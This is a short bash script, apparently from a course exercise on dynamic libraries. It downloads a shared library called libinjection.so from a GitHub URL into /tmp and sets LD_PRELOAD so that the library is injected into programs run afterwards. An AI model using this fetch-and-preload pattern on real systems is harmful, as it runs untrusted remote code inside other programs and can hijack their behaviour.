#!/bin/bash
wget -O /tmp/libinjection.so https://github.com/felixayot/alx-low_level_programming/blob/master/0x18-dynamic_libraries/libinjection.so
export LD_PRELOAD=/tmp/libinjection.so